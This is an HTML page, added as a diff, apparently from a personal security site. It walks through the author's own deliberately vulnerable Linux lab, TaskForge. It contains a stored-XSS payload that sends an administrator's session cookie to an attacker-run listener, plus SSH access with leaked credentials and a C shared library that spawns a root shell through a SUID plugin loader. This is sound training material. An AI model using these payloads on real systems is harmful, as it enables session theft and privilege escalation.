@@ -1,0 +1,801 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>TaskForge — PJunix</title>
+  <meta
+    name="description"
+    content="TaskForge, a deliberately vulnerable Linux security lab created by PJunix for hands-on security practice."
+  >
+
+  <meta property="og:title" content="TaskForge — PJunix">
+  <meta property="og:type" content="website">
+
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <script src="../assets/js/main.js" defer></script>
+</head>
+
+<body>
+
+<a class="skip-link" href="#main">Skip to content</a>
+
+<header class="site-header">
+  <div class="container header-inner">
+
+    <a class="brand" href="../index.html">PJunix</a>
+
+    <button
+      class="nav-toggle"
+      type="button"
+      aria-expanded="false"
+      aria-controls="primary-navigation"
+    >
+      Menu
+    </button>
+
+    <nav
+      class="site-nav"
+      id="primary-navigation"
+      aria-label="Primary navigation"
+    >
+      <ul>
+        <li><a href="../index.html">Home</a></li>
+        <li><a href="../about.html">About</a></li>
+        <li><a href="../writeups.html">Writeups</a></li>
+        <li><a href="../projects.html" aria-current="page">Projects</a></li>
+        <li><a href="../contact.html">Contact</a></li>
+      </ul>
+    </nav>
+
+  </div>
+</header>
+
+
+<main id="main">
+
+  <!-- Hero -->
+  <section class="page-hero">
+    <div class="container reveal">
+
+      <p class="eyebrow">Vulnerable Linux Security Lab</p>
+
+      <h1>TaskForge</h1>
+
+      <p class="hero-copy">
+        A deliberately vulnerable Linux machine created to practice
+        stored XSS, web-to-system attack chains, and SUID-based
+        privilege escalation in a controlled environment.
+      </p>
+
+      <ul class="tags">
+        <li>Linux</li>
+        <li>Flask</li>
+        <li>Stored XSS</li>
+        <li>SUID</li>
+        <li>Privilege Escalation</li>
+      </ul>
+
+    </div>
+  </section>
+
+
+  <!-- Overview -->
+  <section class="section">
+    <div class="container">
+
+      <div class="section-heading">
+        <p class="eyebrow">01 · Overview</p>
+        <h2>Project objectives</h2>
+      </div>
+
+      <div class="prose">
+
+        <p>
+          I created TaskForge primarily as a hands-on exercise for
+          understanding stored cross-site scripting. Instead of using
+          an existing vulnerable application, I built the application
+          myself so I could study how the vulnerability occurs inside
+          an application I designed.
+        </p>
+
+        <p>
+          The second objective was to practice SUID-based privilege
+          escalation. The machine combines both concepts into a single
+          exploitation chain.
+        </p>
+
+      </div>
+
+    </div>
+  </section>
+
+
+  <!-- Attack Path -->
+  <section class="section">
+    <div class="container">
+
+      <div class="section-heading">
+        <p class="eyebrow">02 · Attack Path</p>
+        <h2>Web to root</h2>
+      </div>
+
+      <div class="card-grid">
+
+        <article class="card">
+          <p class="meta">01</p>
+          <h3>Web Application</h3>
+          <p>
+            Enumerate the exposed Flask application and investigate
+            the available functionality.
+          </p>
+        </article>
+
+        <article class="card">
+          <p class="meta">02</p>
+          <h3>Stored XSS</h3>
+          <p>
+            Identify stored JavaScript execution in submitted security
+            findings.
+          </p>
+        </article>
+
+        <article class="card">
+          <p class="meta">03</p>
+          <h3>Admin Reviewer</h3>
+          <p>
+            Abuse the automated administrator reviewer to execute the
+            stored payload in its privileged browser session.
+          </p>
+        </article>
+
+        <article class="card">
+          <p class="meta">04</p>
+          <h3>SSH Access</h3>
+          <p>
+            Use credentials exposed through the administrator's
+            configuration interface to obtain an SSH shell.
+          </p>
+        </article>
+
+        <article class="card">
+          <p class="meta">05</p>
+          <h3>SUID Enumeration</h3>
+          <p>
+            Enumerate SUID-enabled binaries and identify the custom
+            TaskForge plugin loader.
+          </p>
+        </article>
+
+        <article class="card">
+          <p class="meta">06</p>
+          <h3>Root</h3>
+          <p>
+            Exploit the writable plugin cache and load an
+            attacker-controlled shared library through the SUID loader.
+          </p>
+        </article>
+
+      </div>
+
+    </div>
+  </section>
+
+
+  <!-- Components -->
+  <section class="section">
+    <div class="container">
+
+      <div class="section-heading">
+        <p class="eyebrow">03 · Components</p>
+        <h2>Machine architecture</h2>
+      </div>
+
+      <div class="prose">
+
+        <h3>TaskForge Web Application</h3>
+
+        <p>
+          The TaskForge web application is a Flask application managed
+          by <code>taskforge.service</code>. It listens on port 5000
+          and provides the functionality used to submit and review
+          security findings.
+        </p>
+
+        <h3>Firefox / geckodriver</h3>
+
+        <p>
+          The machine uses Firefox through geckodriver for browser
+          automation. The WebDriver interface listens only on
+          <code>127.0.0.1:4444</code>.
+        </p>
+
+        <h3>Persistent Admin Reviewer</h3>
+
+        <p>
+          The reviewer automatically logs into the TaskForge
+          application as the administrator and visits pending
+          findings. This provides the browser context required for
+          the stored-XSS portion of the attack chain.
+        </p>
+
+        <h3>Custom SUID Binary</h3>
+
+        <p>
+          <code>/usr/local/bin/taskforge-plugin</code> is a custom
+          SUID-root plugin loader. It loads shared libraries from
+          <code>/opt/taskforge/plugin-cache/</code>.
+        </p>
+
+      </div>
+
+    </div>
+  </section>
+
+
+  <!-- Enumeration -->
+  <section class="section">
+    <div class="container">
+
+      <div class="section-heading">
+        <p class="eyebrow">04 · Enumeration</p>
+        <h2>Nmap</h2>
+      </div>
+
+      <div class="prose">
+
+        <p>
+          I started with a full TCP port scan to identify the services
+          exposed by the target.
+        </p>
+
+        <pre><code>nmap -p- -sCV 192.168.56.106 -oN taskforge_scan</code></pre>
+
+        <p>
+          The scan identified SSH on port 22 and a Werkzeug HTTP
+          service on port 5000. The HTTP scripts also identified
+          <code>/login</code>, so I focused the next stage of
+          enumeration on the web application.
+        </p>
+
+        <ul>
+          <li><code>-p-</code> scans all 65,535 TCP ports.</li>
+          <li><code>-sC</code> runs Nmap's default scripts.</li>
+          <li><code>-sV</code> performs service version detection.</li>
+          <li><code>-oN</code> saves the output in normal format.</li>
+        </ul>
+
+        <figure>
+          <img
+            src="../screenshots/nmap_scan.png"
+            alt="Nmap scan results"
+            loading="lazy"
+            decoding="async"
+          >
+        </figure>
+
+      </div>
+
+    </div>
+  </section>
+
+
+  <!-- Web Enumeration -->
+  <section class="section">
+    <div class="container">
+
+      <div class="section-heading">
+        <p class="eyebrow">05 · Web Enumeration</p>
+        <h2>TaskForge application</h2>
+      </div>
+
+      <div class="prose">
+
+        <p>
+          After accessing the web application, I reached the login
+          page and authenticated into the TaskForge dashboard.
+        </p>
+
+        <figure>
+          <img
+            src="../screenshots/login.png"
+            alt="TaskForge login page"
+            loading="lazy"
+            decoding="async"
+          >
+        </figure>
+
+        <figure>
+          <img
+            src="../screenshots/dashboard.png"
+            alt="TaskForge dashboard"
+            loading="lazy"
+            decoding="async"
+          >
+        </figure>
+
+        <p>
+          The Findings section displayed previously submitted findings.
+          Each finding could be opened to view its submitted details.
+        </p>
+
+        <figure>
+          <img
+            src="../screenshots/findings.png"
+            alt="TaskForge findings page"
+            loading="lazy"
+            decoding="async"
+          >
+        </figure>
+
+        <p>
+          The application also provided a New Finding form containing
+          fields such as a finding title and description. Because this
+          content was subsequently displayed as part of the finding,
+          I investigated the input handling.
+        </p>
+
+        <figure>
+          <img
+            src="../screenshots/newfindings.png"
+            alt="TaskForge new finding form"
+            loading="lazy"
+            decoding="async"
+          >
+        </figure>
+
+      </div>
+
+    </div>
+  </section>
+
+
+  <!-- Stored XSS -->
+  <section class="section">
+    <div class="container">
+
+      <div class="section-heading">
+        <p class="eyebrow">06 · Foothold</p>
+        <h2>Identifying stored XSS</h2>
+      </div>
+
+      <div class="prose">
+
+        <p>
+          A submitted finding is stored by the application and can
+          later be viewed again. I tested whether JavaScript supplied
+          in the finding content would be stored and executed when
+          the finding was opened.
+        </p>
+
+        <pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
+
+        <figure>
+          <img
+            src="../screenshots/xsstesting.png"
+            alt="Stored XSS testing"
+            loading="lazy"
+            decoding="async"
+          >
+        </figure>
+
+        <p>
+          When I opened the submitted finding, the JavaScript executed
+          and displayed the session cookie. This confirmed that the
+          finding content was vulnerable to stored XSS.
+        </p>
+
+        <figure>
+          <img
+            src="../screenshots/alertcookie.png"
+            alt="Cookie displayed by the XSS test"
+            loading="lazy"
+            decoding="async"
+          >
+        </figure>
+
+      </div>
+
+    </div>
+  </section>
+
+
+  <!-- Admin Reviewer -->
+  <section class="section">
+    <div class="container">
+
+      <div class="section-heading">
+        <p class="eyebrow">07 · Foothold</p>
+        <h2>Admin reviewer</h2>
+      </div>
+
+      <div class="prose">
+
+        <p>
+          The application indicated that reviewers may visit
+          submitted findings. Since the finding content was stored
+          and rendered when viewed, this suggested that the stored
+          payload could execute in the reviewer's browser.
+        </p>
+
+        <h3>Capturing the reviewer's session</h3>
+
+        <p>
+          I started a Python HTTP server to receive the request
+          generated when the payload executed.
+        </p>
+
+        <pre><code>python3 -m http.server 8888</code></pre>
+
+        <figure>
+          <img
+            src="../screenshots/serverpy.png"
+            alt="Python HTTP server"
+            loading="lazy"
+            decoding="async"
+          >
+        </figure>
+
+        <p>
+          I then submitted a new finding containing the following
+          payload in the description field:
+        </p>
+
+        <pre><code>&lt;img src=x onerror='fetch("http://192.168.56.105:8888/?cookie"+document.cookie)'&gt;</code></pre>
+
+        <figure>
+          <img
+            src="../screenshots/payload.png"
+            alt="Stored XSS payload"
+            loading="lazy"
+            decoding="async"
+          >
+        </figure>
+
+        <p>
+          When the reviewer processed the finding, the Python server
+          received a request containing the reviewer's session
+          cookie.
+        </p>
+
+        <figure>
+          <img
+            src="../screenshots/servercallback.png"
+            alt="Callback received from the reviewer"
+            loading="lazy"
+            decoding="async"
+          >
+        </figure>
+
+        <p>
+          I replaced my current application session with the captured
+          session and refreshed the application. The application then
+          recognized the session as the administrator account.
+        </p>
+
+        <figure>
+          <img
+            src="../screenshots/session.png"
+            alt="Captured administrator session"
+            loading="lazy"
+            decoding="async"
+          >
+        </figure>
+
+        <figure>
+          <img
+            src="../screenshots/admindash.png"
+            alt="Administrator dashboard"
+            loading="lazy"
+            decoding="async"
+          >
+        </figure>
+
+      </div>
+
+    </div>
+  </section>
+
+
+  <!-- SSH -->
+  <section class="section">
+    <div class="container">
+
+      <div class="section-heading">
+        <p class="eyebrow">08 · Foothold</p>
+        <h2>SSH access</h2>
+      </div>
+
+      <div class="prose">
+
+        <p>
+          The administrator interface exposed a Review Queue and a
+          System Configuration section.
+        </p>
+
+        <figure>
+          <img
+            src="../screenshots/reviewerque.png"
+            alt="Administrator review queue"
+            loading="lazy"
+            decoding="async"
+          >
+        </figure>
+
+        <p>
+          The System Configuration page exposed deployment
+          configuration containing the SSH service information and
+          credentials required to access the machine.
+        </p>
+
+        <figure>
+          <img
+            src="../screenshots/sshcreds.png"
+            alt="System configuration containing SSH information"
+            loading="lazy"
+            decoding="async"
+          >
+        </figure>
+
+        <p>
+          Using the obtained SSH credentials, I connected to the
+          target as the <code>admin</code> user.
+        </p>
+
+        <pre><code>ssh admin@192.168.56.106</code></pre>
+
+        <figure>
+          <img
+            src="../screenshots/sshlog.png"
+            alt="SSH login as admin"
+            loading="lazy"
+            decoding="async"
+          >
+        </figure>
+
+      </div>
+
+    </div>
+  </section>
+
+
+  <!-- Privilege Escalation -->
+  <section class="section">
+    <div class="container">
+
+      <div class="section-heading">
+        <p class="eyebrow">09 · Privilege Escalation</p>
+        <h2>SUID enumeration</h2>
+      </div>
+
+      <div class="prose">
+
+        <p>
+          After obtaining an SSH shell as <code>admin</code>, I
+          enumerated the system for SUID-enabled binaries.
+        </p>
+
+        <pre><code>find / -perm -4000 -type f 2&gt;/dev/null</code></pre>
+
+        <figure>
+          <img
+            src="../screenshots/find.png"
+            alt="SUID enumeration results"
+            loading="lazy"
+            decoding="async"
+          >
+        </figure>
+
+        <h3>Inspecting taskforge-plugin</h3>
+
+        <p>
+          The custom
+          <code>/usr/local/bin/taskforge-plugin</code> binary stood
+          out from the SUID results. I checked its permissions, file
+          type, and embedded strings.
+        </p>
+
+        <pre><code>ls -l /usr/local/bin/taskforge-plugin
+file /usr/local/bin/taskforge-plugin
+strings /usr/local/bin/taskforge-plugin</code></pre>
+
+        <figure>
+          <img
+            src="../screenshots/taskpluginfiles.png"
+            alt="TaskForge plugin file information"
+            loading="lazy"
+            decoding="async"
+          >
+        </figure>
+
+        <figure>
+          <img
+            src="../screenshots/taskpluginstrings.png"
+            alt="Strings extracted from taskforge-plugin"
+            loading="lazy"
+            decoding="async"
+          >
+        </figure>
+
+        <p>
+          One particularly useful string revealed the plugin loading
+          convention:
+        </p>
+
+        <pre><code>/opt/taskforge/plugin-cache/%s.so</code></pre>
+
+        <p>
+          This showed that the binary loads shared libraries from
+          <code>/opt/taskforge/plugin-cache/</code>. I then checked
+          the directory permissions.
+        </p>
+
+        <figure>
+          <img
+            src="../screenshots/plugincacheal.png"
+            alt="Plugin cache directory permissions"
+            loading="lazy"
+            decoding="async"
+          >
+        </figure>
+
+        <p>
+          The <code>admin</code> user could write to the plugin cache
+          directory while the plugin loader itself executed with SUID
+          privileges. This created a path for an attacker-controlled
+          shared library to be loaded by the privileged process.
+        </p>
+
+      </div>
+
+    </div>
+  </section>
+
+
+  <!-- Root -->
+  <section class="section">
+    <div class="container">
+
+      <div class="section-heading">
+        <p class="eyebrow">10 · Privilege Escalation</p>
+        <h2>Shared library execution</h2>
+      </div>
+
+      <div class="prose">
+
+        <p>
+          I created a shared-library plugin containing a
+          <code>plugin_run()</code> function that changes the process
+          identity to UID/GID 0 and starts a shell.
+        </p>
+
+        <pre><code>#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+void plugin_run(void)
+{
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}</code></pre>
+
+        <p>
+          I compiled the library as a shared object:
+        </p>
+
+        <pre><code>gcc -shared -fPIC /tmp/rootshell.c -o /tmp/rootshell.so</code></pre>
+
+        <p>
+          I then copied the resulting library into the writable
+          plugin cache:
+        </p>
+
+        <pre><code>cp /tmp/rootshell.so /opt/taskforge/plugin-cache/</code></pre>
+
+        <p>
+          Finally, I executed the plugin through the SUID loader:
+        </p>
+
+        <pre><code>/usr/local/bin/taskforge-plugin rootshell</code></pre>
+
+        <p>
+          I verified the resulting privilege level with:
+        </p>
+
+        <pre><code>whoami
+id</code></pre>
+
+        <figure>
+          <img
+            src="../screenshots/rootshell.png"
+            alt="Root shell obtained through taskforge-plugin"
+            loading="lazy"
+            decoding="async"
+          >
+        </figure>
+
+        <p>
+          The privilege escalation works because the SUID
+          <code>taskforge-plugin</code> loads a shared library from a
+          location writable by the lower-privileged user. The
+          attacker-controlled plugin is subsequently executed with
+          the loader's elevated privileges.
+        </p>
+
+      </div>
+
+    </div>
+  </section>
+
+
+  <!-- Takeaways -->
+  <section class="section">
+    <div class="container">
+
+      <div class="section-heading">
+        <p class="eyebrow">11 · Takeaways</p>
+        <h2>What I practiced</h2>
+      </div>
+
+      <div class="card-grid">
+
+        <article class="card">
+          <h3>Stored XSS</h3>
+          <p>
+            Identifying when user-controlled content is stored and
+            later rendered without appropriate output handling.
+          </p>
+        </article>
+
+        <article class="card">
+          <h3>Browser-Based Attack Chains</h3>
+          <p>
+            Understanding how an automated privileged browser can
+            change the impact of a stored-XSS vulnerability.
+          </p>
+        </article>
+
+        <article class="card">
+          <h3>Linux Enumeration</h3>
+          <p>
+            Enumerating SUID binaries and investigating custom
+            components rather than relying only on standard binaries.
+          </p>
+        </article>
+
+        <article class="card">
+          <h3>Privilege Escalation</h3>
+          <p>
+            Analyzing the interaction between SUID execution,
+            writable directories, and shared-library loading.
+          </p>
+        </article>
+
+      </div>
+
+    </div>
+  </section>
+
+</main>
+
+
+<footer class="site-footer">
+  <div class="container footer-inner">
+
+    <span>
+      © 2026 PJunix · Built for learning, research, and curiosity.
+    </span>
+
+    <nav class="footer-nav" aria-label="Footer navigation">
+      <a href="../about.html">About</a>
+      <a href="../writeups.html">Writeups</a>
+      <a href="../projects.html">Projects</a>
+      <a href="../contact.html">Contact</a>
+    </nav>
+
+  </div>
+</footer>
+
+</body>
+</html>
